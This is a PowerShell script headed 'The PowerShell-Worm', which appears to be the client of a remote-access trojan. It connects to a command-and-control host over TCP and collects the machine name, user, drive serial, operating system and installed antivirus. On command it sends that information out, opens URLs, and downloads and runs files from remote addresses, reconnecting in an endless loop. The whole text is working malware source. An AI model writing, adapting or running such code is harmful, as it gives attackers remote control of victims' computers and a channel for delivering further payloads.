#=============================================================
#==================  The PowerShell-Worm   ===================
#========= Development of script programming : Mr3 ===========
#======================== Tcp Socket =========================
#=============================================================
#var
$spl = "<>"
$vn = "Guest"
$sp= "@@@"
$hostname = "127.0.0.1"
$port = "808"
$Path = $env:temp + "\"

#Get name of current script
$ScriptName = $MyInvocation.MyCommand.Name
$fullPathIncFileName = $MyInvocation.MyCommand.Definition
#=============================================================
# object com
$WshShell = New-Object -comObject WScript.Shell
$Sh = New-Object -comObject Shell.Application
$Fs = New-Object -comObject Scripting.FileSystemObject
#=============================================================
# Function get information
function info { 

    $mch = [environment]::Machinename
    $usr = [environment]::username
    $SerialNumber = $Fs.GetDrive("c:\").SerialNumber
    $SerialNumber = "{0:X}" -f $SerialNumber
    $HWD = $SerialNumber
    
    $wi = (Get-WmiObject Win32_OperatingSystem).Caption
    $wi = $wi + (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $wi =$wi.replace('64-bit',' x64').replace('32-bit',' x86').replace('?','e');
    $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    $nanav =""
    if ($av -eq $null) 
    {$av = 'nan-av'}
    $e = $env:windir + '\Microsoft.NET\Framework\v2.0.50727\vbc.exe';
    if (test-path $e) 
    {$nt = '.Net YES'} 
    else 
    {$nt= '.Net NO'};
     if (test-path 'HKCU:\vdw0rm')
     {$usb = 'TRUE'} else { $usb = 'FALSE'};
    $u = $sp + 'PC' + $spl + $vn + '_' + $HWD+ $spl + $mch + $spl + $usr + $spl + $wi + $spl + $nt + $spl + $av + $spl + $usb + $spl + $sp;
     return $u
     
 }
# Function Spread -shortcut-usb 
#============================================================= 
# Function Kills CURRENT instance if this script already running. 

#=============================================================
$Client = New-Object -TypeName System.Net.Sockets.TcpClient
$Client.Connect($hostname, $port)
$tcpStream = $Client.GetStream()

$fl= $true
$tr = $true

while($tr) {

     [System.Threading.Thread]::Sleep(0)    

 if ($Client.Connected -eq $fl ){
         if ($Client.ReceiveBufferSize -gt -1 ){
       
                   #get data 2048
                    $buffer = New-Object -TypeName System.Byte[] $Client.ReceiveBufferSize
                    $read = $tcpStream.Read($buffer, 0, $Client.ReceiveBufferSize);
                    $P =[System.Text.Encoding]::Default.GetString($buffer, 0,$read)
                    $T = $p.split($spl)
        
                 if ($T[0] -eq 'pc') {
                     #send data
                    $message = info
                    $tcpStream = $Client.GetStream()
                    $data = [System.Text.Encoding]::ASCII.GetBytes($message)
                    $tcpStream.Write($data, 0, $data.Length)
                      
                  }
                  
                 if ($T[0] -eq 'cl') {
                 
                     exit
                  
                  }
                  
                 # reconnect
                 if ($T[0] -eq 'dis') {
                   
                     $tcpStream.Dispose()
                     $Client.Close()
                        
                  } 
                  
                 if ($T[0] -eq 'url') {
       
                     [System.Diagnostics.Process]::Start($T[2]) 
                   
                  }
                  
                 if ($T[0] -eq 'Dow') {
                   
                     $wc = New-Object System.Net.WebClient
                     $wc.DownloadFile($T[2], $Path + $T[4] )
                     [System.Diagnostics.Process]::Start($Path + $T[4]) 

                 }
                  
                  
      
         }else {
        $tcpStream.Dispose()
        $Client.Close()
        $Client = New-Object System.Net.Sockets.TcpClient($hostname,$port)
        $tcpStream = $Client.GetStream()
       
         }
 
 
  }else {
    $tcpStream.Dispose()
    $Client.Close()
    $Client = New-Object System.Net.Sockets.TcpClient($hostname,$port)
    $tcpStream = $Client.GetStream()
   
 }


Start-Sleep -M 10

 }






